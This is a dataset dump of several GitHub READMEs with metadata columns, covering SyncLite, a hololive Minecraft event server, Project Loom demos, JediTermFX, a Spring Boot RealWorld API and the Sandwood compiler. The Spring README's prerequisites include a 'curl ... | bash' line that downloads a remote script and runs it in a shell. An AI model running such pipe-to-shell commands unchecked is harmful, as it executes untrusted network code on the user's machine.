```
import jaydebeapi
props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""streaming1""
}
conn = jaydebeapi.connect(""io.synclite.logger.Streaming"",
                           ""jdbc:synclite_streaming:c:\\synclite\\python\\data\\t_str.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)

curs = conn.cursor()

#Example of executing a DDL : CEATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\t_str.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

## Application Code Samples (Kafka API)

```
package testApp;

import io.synclite.logger.*;

public class TestKafkaProducer {

	public static void main(String[] args) throws Exception {

		Properties props = new Properties();
	    
		//
		//Set properties to use a staging storage of your choice e.g. S3, MinIO, SFTP etc. 
		//where SyncLite logger will ship log files continuously for consumption by SyncLite consolidator
		//
		
        	Producer<String, String> producer = new io.synclite.logger.KafkaProducer(props);

		ProducerRecord<String, String> record = new ProducerRecord<>(""test"", ""key"", ""value"");
        
		//
		//You can use same or different KafkaProducer objects to ingest data concurrently over multiple theads.
		//
        	producer.send(record);
		
		produer.close();

	}
```

# Launching and using SyncLite DB

```SyncLite DB``` is a sync-enabled, single-node database server that wraps popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL. Unlike the embeddable ```SyncLite Logger``` library for Java and Python applications, ```SyncLite DB``` acts as a standalone server, allowing your edge or desktop applications—regardless of the programming language—to connect and send/post SQL requests (wrapped in JSON format) via a REST API. This makes it an ideal solution for seamless, real-time data synchronization in diverse environments.

1. Go to the directory ```synclite-platform-<version>\tools\synclite-db```
2. Check the configurations in synclite-db.conf and adjust them as per your needs.
3. Run ```synclite-db.bat --config synclite-db.conf``` ( OR ```synclite-db.sh --config synclite-db.conf``` on linux). This starts the SyncLite DB server listening at the specified address.
4. An application in your favoirite programming language can establish a connection with the SyncLite DB server at the specified address and send requests in JSON format as below

	- Connect and initialize a device

   	Request
	```
 	{
 		""db-type"" : ""SQLITE""
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""synclite-logger-config"" : ""C:\synclite\users\bob\synclite\job1\synclite_logger.conf""
 		""sql"" : ""initialize""
 	}
  	```

 	Response from Server 
 	```
  	{
  		""result""  : true	
 		""message"" : ""Database initialized successfully""
 	}
  	```
  
	- Send a sql command to create a table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""CREATE TABLE IF NOT EXISTS(a INT, b INT)""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Update executed successfully, rows affected: 0""
   	}
  	```
  
	- Send a request to perform a batched insert in the created table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
 		""arguments"" : [[1, ""one""], [2, ""two""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to begin a transaction on database

 	Request
	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""begin""
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction started successfully""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
   	}
  	```
	
	- Send a request to execute a sql inside started transaction

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
 		""arguments"" : [[3, ""three""], [4, ""four""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to commit a transaction

	Request	
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
 		""sql"" : ""commit""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction committed successfully""
   	}
  	```

	- Send a request to close database   	
 	Request

	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""close""
   	}
 	```
	
 	Response from Server 
 	```
  	{
  		""result"" : ""true""
		""message"" : ""Database closed successfully""
   	}
  	```
 
5. SyncLite DB (internally leveraging SyncLite Logger), creates a device stage directory at configured stage path with sql logs created for each device. These device stage directories are continuously synchronized with SyncLite consolidator for consolidating them into final destination databases.
   
6. Several such hosts, each running SyncLite DB, each of them creating several SyncLite databases/devices (i.e. embedded databases), can synchornize these embedded databases in real-time with a centralized SyncLite consolidator that aggregates the incoming data and changes, in real-time, into configured destination databases.

     
# Running Integration Tests

```SyncLite Validator``` is a GUI based tool with a war file deployed on app server, it can be launched at http://localhost:8080/synclite-validator. A test job can be configured and run to execute all the end to end integration tests which validate data consolidation functionality for various SyncLite device types.  
    
	
# Pre-Built Releases:

## SyncLite Logger

1. SyncLite Logger is is published as maven dependency :
   ```
	<!-- https://mvnrepository.com/artifact/io.synclite/synclite-logger -->
	<dependency>
	    <groupId>io.synclite</groupId>
	    <artifactId>synclite-logger</artifactId>
	    <version>#LatestVersion#</version>
	</dependency>
   ```
2. OR You can directly download the latest published synclite-logger-<version>.jar from : https://github.com/syncliteio/SyncLiteLoggerJava/blob/main/src/main/resources/ and add it as a dependency in your applications.
   
## SyncLite Consolidator

1. A docker image of SyncLite Consolidator is available on docker hub : https://hub.docker.com/r/syncliteio/synclite-consolidator

2. OR a release zip file can be downloaded from this GitHub Repo : https://github.com/syncliteio/SyncLite/releases

# Supported Systems

## Source Systems
1. Edge Applications(Java/Python) +  SyncLite Logger (wrapping embedded databases :SQLite, DuckDB, Apache Derby, H2, HyperSQL)
2. Edge Applications (any programming language) + SyncLite DB (wrapping embedded databases :SQLite, DuckDB, Apache Derby, H2, HyperSQL)
3. Databases : PostgreSQL, MySQL, MongoDB, SQLite
4. Message Brokers : Eclipse Mosquitto MQTT broker
5. Data Files : CSV ( stored on FS/S3/MinIO)

## Staging Storages
1. Local FS
2. SFTP
3. S3
4. MinIO
5. Kafka
6. Microsoft OneDrive
7. Google Drive
   
## Destination Systems
1. PostgreSQL
2. MySQL
3. MongoDB
4. Microsoft SQL Server
5. Apache Iceberg
8. ClickHouse
9. FerretDB
6. SQLite
7. DuckDB

# Patent
SyncLite is backed by patented technlogy, more info : https://www.synclite.io/resources/patent  

# Support
Join <a href=https://join.slack.com/t/syncliteworkspace/shared_invite/zt-2pz945vva-uuKapsubC9Mu~uYDRKo6Jw>Slack Channel</a> for support and discussions.

Contact: support@synclite.io
",3,3,5,5.0,"['synclite', 'build', 'anything', 'sync', 'anywhere', 'build', 'application', 'build', 'streaming', 'application', 'for', 'last', 'mile', 'delivery', 'deploy', 'database', 'pipeline', 'setup', 'rapid', 'iot', 'data', 'connector', 'synclite', 'component', 'build', 'synclite', 'release', 'structure', 'quick', 'start', 'base', 'use', 'synclite', 'logger', 'configuration', 'file', 'application', 'code', 'sample', 'sql', 'api', 'transactional', 'device', 'java', 'python', 'appender', 'device', 'java', 'python', 'stream', 'device', 'java', 'python', 'application', 'code', 'sample', 'kafka', 'api', 'launch', 'use', 'synclite', 'db', 'run', 'integration', 'test', 'release', 'synclite', 'logger', 'synclite', 'consolidator', 'support', 'system', 'source', 'system', 'stag', 'storage', 'destination', 'system', 'patent', 'support']","['synclite', 'build', 'application', 'device', 'java']",1.0,[org.apache.maven.plugins:maven-assembly-plugin],0.0,0.0,1.0
aemisigna/hololiveid-kaela-event-public,main,"![Kaela's Event Logo](https://cdn.marow.dev/content/kaela_event_git_logo.png)

**Astonishingly KAEOTIC** is a Minecraft Event hosted by [Kaela Kovalskia](https://www.youtube.com/@KaelaKovalskia) and [hololive production](https://hololive.hololivepro.com/en).

[![Kaela's Tour](https://img.youtube.com/vi/n3BAPr9qGGQ/0.jpg)](https://www.youtube.com/watch?v=n3BAPr9qGGQ)

## 🔨 Technical details
- Server must use the [PaperMC](https://papermc.io) and [Nitori](https://github.com/Gensokyo-Reimagined/Nitori) software.
- It's recommended to use a proxy software like [Velocity](https://papermc.io/software/velocity) or [BungeeCord](https://www.spigotmc.org/wiki/bungeecord/).
- It's highly recommended to enable the server [resource pack](https://cdn.marow.dev/content/KaelaEventPack.zip), otherwise stuff might be a little weird.

## 🔨 Resource Pack
- Resource pack can be downloaded [here](https://cdn.marow.dev/content/KaelaEventPack.zip)
- Resources are on Minecraft version **1.21.1**.

## 🔨 Warning
- This server setup was made for [COVER Corporation](https://cover-corp.com/en/company) & [hololive production](https://hololive.hololivepro.com/en).
- The server is not made to be easy to install outside of the event host.
- This page is going to change by the time!

## 🔨 Acknowledgments
- [COVER Corporation](https://cover-corp.com/en/company) for once more, hosting awesome events!
- [Kaela Kovalskia](https://www.youtube.com/@KaelaKovalskia) for the opportunity!
- [Allan Castro](https://x.com/Allan_z8), for the server resource pack making.",1,0,1,0.0,"['technical', 'detail', 'resource', 'pack', 'warn', 'acknowledgment']","['technical', 'detail', 'resource', 'pack', 'warn']",1.0,"[ca.bkaw:paper-nms-maven-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
wkorando/loominated-java,main,"# Loominated Java

The purpose of this project is to introduce and demonstrate the three central features of [Project Loom](https://openjdk.org/projects/loom/); [Virtual Threads](#virtual-threads), [Structured Concurrency](#structured-concurrency), and [Scoped Values](#scoped-values). Primarily the project is demonstrating using Structured Concurrency to break down an unit of work and execute it as concurrent tasks. 

You can view the accompanying presentation for this project here: https://wkorando.github.io/presentations/loominated-java/

## Virtual Threads

The central feature of Project Loom, virtual threads separate the concept of threads into two distinct parts. The Platform Thread, which is functionally similar to legacy Threads in, which have a one-to-one relationship to OS threads. And Virtual Threads, which exist in memory and run on top of platform threads. For a high-level overview of virtual threads, see this video: [https://www.youtube.com/watch?v=bOnIYy3Y5OA](https://www.youtube.com/watch?v=bOnIYy3Y5OA). For a more in-depth explanation on virtual threads be sure to read the [JEP 444](https://openjdk.org/jeps/444). 

## Structured Concurrency

Structured Concurrency, currently in preview as of JDK 23, is designed to allow developers to break a unit of work into multiple tasks that can be executed simultaneously. Structured concurrency introduces a new programming model to Java greatly simplifying the writing (and reading) of concurrent blocks of code, as well as error handling and debugging. Both of which will be covered in this project. 

## Scoped Values

With the introduction of virtual threads, and the possibility of tens of thousands, or more, concurrent threads being handled by a JVM, comes new issues. Historically in Java contextual information when Scoped Values were intended to 


https://openjdk.org/jeps/8338456

## About the Project

### Running the Project

This project is using the latest changes from the Loom EA builds, they are available for download here: [https://jdk.java.net/loom/](https://jdk.java.net/loom/)

### The ""Task""

The purpose of this project is to demonstrate running tasks concurrently, so isn't particularly concerned with the look of the task(s) being executed. The task, as designed, is simply wrapping a passed in value in a simple JSON message only to provide a thin veneer of similarity to real-world tasks. The task however is designed to be easily configurable in how long it takes to execute and/or if an error occurs during. 

```java
public static String task(String value, long executionTime, boolean throwException) {
	executionTime(executionTime);
	if (throwException) {
		throw new RuntimeException(String.format(""""""
				Task failed!
				value: %s
				executionTime: %d
				throwException: %b
				"""""", value, executionTime, throwException));
	}
	String result = String.format(""""""
			{
				""value"" : ""%s""
			}
			"""""", value);
	System.out.println(""Result of taks: "" + result);
	return result;
}
```

### Working with the Project

The project is divided in five steps, roughly representing ""maturity"" regarding concurrent concepts.

* [Step 1](#step-1-linear-programming) - Tasks are executed in serial, because the effort of writing the code concurrently was too difficult/not worth the effort.

* [Step 2](#step-2-concurrent-programming-pre-virtual-threads) - Tasks executed concurrently, but without using virtual threads. 

* [Step 3](#step-3-concurrent-programming-pre-structured-concurrency) - Tasks executed concurrently, but using virtual threads. Examples also go into the difficulty of error handling and cancel propagation in a pre-structured concurrency world. 

* [Step 4](#step-4-concurrent-programming-with-structured-concurrency) - Various examples and scenarios demonstrating how to use structured concurrency to execute tasks concurrently.

* [Step 5](#step-5-working-with-scoped-values) - Simple examples using Scoped Values. 

### Step 1 - Linear Programming

The mindshare and difficulty of concurrent programming; configuring and managing threadpools, error handling and rollback when a task fails, the change in programming model, and disincentivized re-writing tasks from executing concurrently. Though meant that the time to execute tasks was the combined time to execute all the tasks, like in this example. This might often result in slow response times for clients. Like in this example. 

### Step 2 - Concurrent Programming Pre-Virtual Threads

Prior to virtual threads, when considering splitting a unit of work to be executed in concurrent tasks. This would making a choice between the best way of handling 

### Step 3 - Concurrent Programming Pre-Structured Concurrency

Splitting up a unit of work and executing it as concurrent tasks, wasn't always trivial, as we will review in these code examples. 

#### Cancel Propagation

Canceling other concurrent tasks when either a success of failure condition is met was difficult prior to structured concurrency. 

#### Debugging

When using [ ], the relationship between the tasks and subtasks wasn't tracked. This could make debugging difficult for applications receiving many requests, as it would be difficult to determine the parent thread that started the execution of the subtask. 

### Step 4 - Concurrent Programming with Structured Concurrency

#### Configuring Joiner Policies

#### Custom Cancellation Policies


### Step 5 - Working with Scoped Values


### Current State

Various ways of implementing a solution that can be broken into sub tasks executed concurrently. 

1. [SerialSolution](src/main/java/com/fly/us/SerialSolution.java) - Demonstrates calling multiple tasks serially. Easy to implement, understand, and debug, but slow, as the time to execute is the sum of all the tasks. 

2. [FuturesSolutionPreVirtualThreads](src/main/java/com/fly/us/FuturesSolutionPreVirtualThreads.java) - Pre Virtual Threads, there are many different executors to choose from with their own relative strengths and weaknesses. Knowing which to use was difficult.

3. [FuturesSolutionWithVirtualThreads](src/main/java/com/fly/us/FuturesSolutionWithVirtualThreads.java) - Demonstrates the new `Executors.newVirtualThreadPerTaskExecutor()`. Which should be used in nearly all cases. Just let the JDK handle mounting/unmounting virtual threads, they are cheap!

4. [FuturesSolutionShutdownOnError](src/main/java/com/fly/us/FuturesSolutionShutdownOnError.java) - The trouble with concurrency is failures happen! This is an example of the difficulty of handling that use case in current state. Primarily the canceling the execution of other tasks when a failure is detected. 

4. [FuturesSolutionShutdownOnSuccess](src/main/java/com/fly/us/FuturesSolutionShutdownOnSuccess.java) - Alternatively, maybe you want to get the first successful result. This example demonstrates that behavior. 

### Error Handling

### Debugging


",0,0,1,1.0,"['loominated', 'java', 'virtual', 'thread', 'structured', 'concurrency', 'scoped', 'value', 'about', 'project', 'run', 'project', 'the', 'task', 'work', 'project', 'step', 'linear', 'programming', 'step', 'concurrent', 'program', 'thread', 'step', 'concurrent', 'program', 'concurrency', 'cancel', 'propagation', 'debug', 'step', 'concurrent', 'program', 'structured', 'concurrency', 'configure', 'joiner', 'policy', 'custom', 'cancellation', 'policy', 'step', 'work', 'scoped', 'value', 'current', 'state', 'error', 'handle', 'debug']","['step', 'concurrency', 'project', 'concurrent', 'program']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
PavelKastornyy/jeditermfx,master,"# JediTermFX
* [Overview](#overview)
* [Demo](#demo)
* [Features](#features)
* [Terminal Comparison](#comparison)
* [Usage](#usage)
    * [Hyperlinks](#usage-hyperlinks)
* [Code building](#code-building)
* [Running the Application](#application)
    * [Using Maven](#application-maven)
    * [Using Distro](#application-distro)
* [License](#license)
* [Feedback](#feedback)

# Overview <a name=""overview""></a>

JediTermFX is a Terminal Emulator for JavaFX. The project is a result of porting
[JediTerm](https://github.com/JetBrains/jediterm) (commit 8366f2b) from Swing to JavaFX. JediTermFX exclusively
utilizes JavaFX components. Therefore, the Terminal Emulator based on this library can be seamlessly integrated into
any JavaFX application. A detailed comparison of terminal libraries is provided below.

# Demo <a name=""demo""></a>

![JediTermFX demo](./demo.gif)

# Features <a name=""features""></a>

* Local terminal for Unix, Mac and Windows using Pty4J
* Xterm emulation - passes most of tests from vttest
* Xterm 256 colours
* Scrolling
* Copy/Paste
* Mouse support
* Terminal resizing from client or server side
* Terminal tabs

# Terminal Comparison <a name=""comparison""></a>

Terminal      | JediTermFX  | [JediTerm](https://github.com/JetBrains/jediterm)  | [TerminalFX](https://github.com/javaterminal/TerminalFX) |
:-------------|:----------- |:--------------|:--------------|
GUI Library   | JavaFX      | Swing         | JavaFX        |
Main Component| Canvas      | JComponent    | WebView       |
Languages     | Java        | Java, Kotlin  | Java, JS      |
JPMS Support  | Yes         | No            | Yes           |

# Usage <a name=""usage""></a>

It is recommended to start working with JediTermFX by studying and running the
[BasicTerminalShellExample](jeditermfx-app/src/main/java/pk/jeditermfx/app/example/BasicTerminalShellExample.java) class.
This class contains the minimal code needed to launch a terminal in a JavaFX application.

## Hyperlinks <a name=""usage-hyperlinks""></a>

JediTermFX provides a wide range of features when working with links. The `HighlightMode` enumeration specifies multiple
modes of working with links and their colors. In the `ALWAYS` modes, links are always underlined and always clickable.
In the `NEVER` modes, links are never underlined and never clickable. In the `HOVER` modes, links become underlined and
clickable only when hovered over. Now let's clarify the difference between the two types of colors. `CUSTOM` colors
are those set by the JediTermFX user in the getHyperlinkColor() method of the settings. `ORIGINAL` colors are those
offered by the program running in the terminal. Thus, links can use either custom colors or the original text colors.

# Code Building <a name=""code-building""></a>

To build the library use standard Git and Maven commands:

    git clone https://github.com/PavelKastornyy/jeditermfx
    cd jeditermfx
    mvn clean install

# Running the Application <a name=""application""></a>

The project contains a demo application that shows how to use this library. There are two ways to run the application.

## Using Maven <a name=""application-maven""></a>

To run application using maven plugin execute the following commands in the root of the project:

    cd jeditermfx-app
    mvn javafx:run

Please note, that debugger settings are in `jeditermfx-app/pom.xml` file.

## Using Distro <a name=""application-distro""></a>

After building the project, you will find a distribution archive named `jeditermfx-version-app.tar` in the
`jeditermfx-app/target` directory. Extracting this file will allow you to launch the application using `.sh` or `.bat`
scripts depending on your operating system.

# License <a name=""license""></a>

JediTermFX is dual-licensed under both the LGPLv3 (found in the LICENSE-LGPLv3.txt file in the root directory) and
Apache 2.0 License (found in the LICENSE-APACHE-2.0.txt file in the root directory). You may select, at your option,
one of the above-listed licenses.

# Feedback <a name=""feedback""></a>

Any feedback is welcome. Besides, it would be interesting to know for what cases this project is used. It will
help to understand the way the project should go and provide more information in documentation.



",0,0,1,3.0,"['jeditermfx', 'overview', 'a', 'overview', 'demo', 'a', 'demo', 'feature', 'a', 'feature', 'terminal', 'comparison', 'a', 'comparison', 'usage', 'a', 'usage', 'hyperlink', 'a', 'code', 'building', 'a', 'run', 'application', 'a', 'application', 'use', 'maven', 'a', 'use', 'distro', 'a', 'license', 'a', 'license', 'feedback', 'a', 'feedback']","['a', 'overview', 'demo', 'feature', 'comparison']",4.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.openjfx:javafx-maven-plugin]",0.0,3.0,1.0
sivaprasadreddy/spring-realworld-conduit-api,main,"# Spring Boot RealWorld Conduit API

![Spring Boot RealWorld Conduit API](logo.png)

**Spring Boot RealWorld Conduit API** implements the [API Endpoints](https://realworld-docs.netlify.app/docs/specs/backend-specs/endpoints) of [Conduit](https://github.com/gothinkster/realworld),
which is a Medium.com clone.

[![CI Build](https://github.com/sivaprasadreddy/spring-realworld-conduit-api/actions/workflows/maven.yml/badge.svg)](https://github.com/sivaprasadreddy/spring-realworld-conduit-api/actions/workflows/maven.yml)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=sivaprasadreddy_spring-realworld-conduit-api)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=coverage)](https://sonarcloud.io/summary/new_code?id=sivaprasadreddy_spring-realworld-conduit-api)

## Tech Stack
* [Java 21](https://dev.java/)
* [Spring Boot](https://spring.io/projects/spring-boot)
* [Spring Security](https://spring.io/projects/spring-security)
* [Spring Modulith](https://spring.io/projects/spring-modulith)
* [jOOQ](https://www.jooq.org/)
* [PostgreSQL](https://www.postgresql.org/)
* [FlywayDB](https://flywaydb.org/)
* [JUnit 5](https://junit.org/junit5/)
* [Testcontainers](https://testcontainers.com/)
* [Docker Compose](https://docs.docker.com/compose/)

## Prerequisites
* JDK 21
* Docker and Docker Compose
* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))

Install JDK using [SDKMAN](https://sdkman.io/)

```shell
$ curl -s ""https://get.sdkman.io"" | bash
$ source ""$HOME/.sdkman/bin/sdkman-init.sh""
$ sdk install java 21.0.1-tem
$ sdk install maven
```

Verify the prerequisites

```shell
$ java -version
openjdk version ""21.0.1"" 2023-10-17 LTS
OpenJDK Runtime Environment Temurin-21.0.1+12 (build 21.0.1+12-LTS)
OpenJDK 64-Bit Server VM Temurin-21.0.1+12 (build 21.0.1+12-LTS, mixed mode)

$ docker info
Client:
 Version:    27.0.3
 Context:    desktop-linux
 ...
 ...
Server:
 Server Version: 27.0.3
 ...
 ...

$ docker compose version
Docker Compose version v2.28.1-desktop.1
```

## How to?

```shell
# Clone the repository
$ git clone https://github.com/sivaprasadreddy/spring-realworld-conduit-api.git
$ cd spring-realworld-conduit-api

# Run tests
$ ./mvnw test

# Automatically format code using spotless-maven-plugin
$ ./mvnw spotless:apply

# Run/Debug application from IDE
Run `src/main/java/conduit/ConduitApplication.java` from IDE.

# Run application using Maven
./mvnw spring-boot:run
```

The application is configured to use Docker Compose to automatically start the application dependencies
such as PostgreSQL.

* PostgreSQL container connection properties:
  ```shell
  host: localhost
  port: 65432
  username: postgres
  password: postgres
  database: postgres
  ```
* Application run on port http://localhost:8080
* Swagger UI: http://localhost:8080/swagger-ui/index.html

## Using [Taskfile](https://taskfile.dev/) utility
Task is a task runner that we can use to run any arbitrary commands in easier way.

### Installation

```shell
$ brew install go-task
(or)
$ go install github.com/go-task/task/v3/cmd/task@latest

#verify task version
$ task --version
Task version: 3.35.1
```

### Using `task` to perform various tasks:

```shell

# Run tests
$ task test

# Automatically format code using spotless-maven-plugin
$ task format

# Build docker image
$ task build_image

# Run application in docker container
$ task start
$ task stop
$ task restart
```
",0,1,4,0.0,"['spring', 'boot', 'realworld', 'conduit', 'api', 'tech', 'stack', 'prerequisite', 'how', 'to', 'clone', 'repository', 'run', 'test', 'automatically', 'format', 'code', 'use', 'application', 'ide', 'run', 'application', 'use', 'maven', 'use', 'taskfile', 'http', 'utility', 'installation', 'use', 'task', 'perform', 'various', 'task', 'run', 'test', 'automatically', 'format', 'code', 'use', 'build', 'docker', 'image', 'run', 'application', 'docker', 'container']","['use', 'run', 'application', 'test', 'automatically']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:properties-maven-plugin,org.graalvm.buildtools:native-maven-plugin,org.jacoco:jacoco-maven-plugin,org.sonarsource.scanner.maven:sonar-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.testcontainers:testcontainers-jooq-codegen-maven-plugin]",0.0,1.0,0.0
oracle/sandwood,main,"# Sandwood
Sandwood is a language, compiler, and runtime for JVM based probabilistic models. It is designed to allow models to be written in a language that is familiar to Java developers. The resulting models take the form of Java objects allowing them to be well abstracted components of an encompassing system.

## What is probabilistic programming?
With a traditional Bayesian Model the user has to design the model, and then implement inference code for any operation they wish to perform on the model. This creates a number of issues:

1. Constructing inference code is technically challenging to do, and time consuming. This step presents an opportunity for subtle bugs to be introduced.

2. If the model is modified, then the inference code will have to be updated. This is also time consuming and technically challenging, leading to the following problems:

  * It acts as a deterrent to modifying models.

  * It is possible for different inference operations to get out of step so some work on the old model and some work on the new model.

  * It presents another opportunity for bugs to get in the inference algorithm as users try to make subtle adjustments to existing code.
	
3. Looking at the code it is hard to see what the model is. This harms maintainability.

Probabilistic programming overcomes these issues by allowing models to be described using either an API, or a domain specific language (DSL) as is the case with Sandwood. The [Sandwood DSL](docs/Sandwood.md) is compiled to produce Java classes that represent the model and implement all the required inference operations. This has a number of advantages:
* Users are no longer required to handle the technical complexity of constructing inference code.
* Updating the model is now just requires changes to the high-level language and then recompilation to generate the new inference code.
* Models described in the high-level language are much more understandable improving code maintainability.
* All the inference operations are guaranteed to be for the same model.
* User bugs are confined to the model, with the inference code coming from the compiler.

## Installation
Sandwood consists of 3 components each in their corresponding directory:

- The compiler and runtime (Sandwood)
- The plugin for Maven (SandwoodMavenPlugin)
- A set of example models (SandwoodExamples)

Each piece is dependent on the preceding pieces. Each component directory contains a Maven POM file to construct the component. For the compiler and the plugin these will need to be called with `install` to make them available for later stages, i.e. `mvn clean install`. The examples should only be built as `mvn clean package`.

Having installed Sandwood there are currently 3 ways of compiling a model:
1. A command line tool.
2. A Java library call.
3. A Maven plugin.

### Command Line Tool
To use Sandwood from the command line once the compiler and runtime have been built command line scripts that have similar functionality to `javac` can be found in `commandline/SandwoodC/bin`. To use this the user would typically add the bin directory to the path, then call sandwoodc.sh HMM.sandwood to compile the HMM model. `sandwoodc.sh -h` or `sandwoodc.bat -h` will result in a description of the usage and available options being printed out.

### Java Library Call
All the functionality of SandwoodC can be reached by calling the method `compile` in `org.sandwood.compilation.SandwoodC` and passing an array containing the arguments that would have been passed to the command line.

### Maven Plugin
The Maven plugin can be used to automatically trigger compilation of sandwood files when the dependent project is built. To use the plugin you need to add the sandwood runtime as a dependency, and add the plugin to the build. This is achieved with the following additions to the POM file:

```
<dependencies>
	<dependency>
		<groupId>org.sandwood</groupId>
		<artifactId>sandwood-runtime</artifactId>
		<version>0.3.0</version>
	</dependency>
</dependencies>
```

```
<build>
	<plugins>
		<plugin>
			<groupId>org.sandwood</groupId>
			<artifactId>sandwoodc-maven-plugin</artifactId>
			<version>0.3-SNAPSHOT</version>
			<executions>
				<execution>
					<configuration>
						<partialInferenceWarning>true</partialInferenceWarning>
						<sourceDirectory>${basedir}/src/main/java</sourceDirectory>
					</configuration>
					<goals>
						<goal>sandwoodc</goal>
					</goals>
				</execution>
			</executions>
		</plugin>
	</plugins>
</build>`
```

The inclusion of the element `<sourceDirectory>${basedir}/src/main/java</sourceDirectory>` instructs the plugin which directory to look in for models. Other useful flags include:

* `debug` This option is used to obtain debugging information from SandwoodC. Setting this option to `true` causes Sandwood to generate a trace of its actions. The default value is `false`. Note this flag is for debugging errors with the compiler configuration/compiler, not with the model being compiled. Errors and warnings in the sandwood model files will always be returned by the compiler.

* `partialInferenceWarning` This option is used to stop SandwoodC from failing when some inference steps cannot be constructed. Setting this option to `true` causes Sandwood to just generate warnings on missing steps. Default value is `false`.

* `sourceDirectory` This parameter sets which directory to look in for model files. Within this directory the models can be located in different packages.

* `outputDirectory` This parameter sets which directory the Java source code for the models should be placed into. The default value is `${project.build.directory}/generated-sources/sandwood`.

* `calculateIndividualProbabilities` This parameter specifies if the probabilities for each random variable constructed  in a loop should be calculated instead of a single value for all instances. The default value is `false`.

* `javadoc` This parameter instructs the compiler to generate JavaDoc to compliment the model. The default value is `false`.

* `javadocDirectory` This parameter specifies the location that the generated should be placed.

* `executable` This parameter allow for an alternative JVM to be specified to run the Sandwood compiler with.

## Documentation
What follows is an introduction to how to write Sandwood models and how to use the resultant classes that implement the models. 

An outline of the steps a model goes through can be seen in this diagram. Models start as a `.sandwood` file that is compiled to a set of class files. These can be instantiated multiple times to generate multiple instances of the model with different configurations.

![Picture describing the stages of sandwood model from source code to instantiated objects in a program.](docs/images/Components.jpg ""Picture describing the stages of sandwood model from source code to instantiated objects in a program."")


### Example Model
As a running example we will use a [Hidden Markov Model (HMM)](https://en.wikipedia.org/wiki/Hidden_Markov_model). This model is written here in Sandwood. This model should be saved in a file called `HMM.sandwood` in a package directory `org/sandwood/examples/hmm`. A fuller description of the language can be found [here](docs/Sandwood.md).

```java
package org.sandwood.examples.hmm;
 
model HMM(int[] eventsMeasured, int numStates, int numEvents) {
  //Construct a transition matrix m.
  double[] v = new double[numStates] <~ 0.1;
  double[][] m = dirichlet(v).sample(numStates);
 
  //Construct weighting for which state to start in.
  double[] initialState = new Dirichlet(v).sample();
      
  //Construct weighting for each event in each state.
  double[] w = new double[numEvents] <~ 0.1;
  double[][] bias = dirichlet(w).sample(numStates);
 
  //Allocate space to record the sequence of states.
  int sequenceLength = eventsMeasured.length;
  int[] st = new int[sequenceLength];
 
  //Calculate the movements between states.
  st[0] = categorical(initialState).sampleDistribution();
  for (int i: [1..sequenceLength) )
    st[i] = categorical(m[st[i - 1]]).sampleDistribution();
 
  //Emit the events for each state.
  int[] events = new int[sequenceLength];
  for (int j = 0; j < sequenceLength; j++)
    events[j] = new Categorical(bias[st[j]]).sample();
    
  //Assert that the events match the eventsMeasured data.
  events.observe(eventsMeasured);
}
```

In addition to the documentation of the Sandwood language and the JavaDoc comment that can be generated for a model there are a number of examples in the Sandwood Examples directory and we suggest new users start by examining and modifying these.

### Sandwood language
A description of the language used to describe Sandwood models can be found [here](docs/Sandwood.md). The language is constructed with the intent of being familiar to Java developers, but does not contain the ability to construct Objects. We plan to add support for record types in the future to make the import and export of data to and from models simpler.

### Compiled models
When a model is compiled a number of class files are generated in the same package that the model is defined in. One of these classes will have the same name as the name provided to the model, so in this case  _HMM.class_ , and this is the class that the user should instantiate in order to have an instance of the model. Each publicly visible variable in the model corresponds to a field in the generated class. The [example HMM](#example-model) can be seen below.

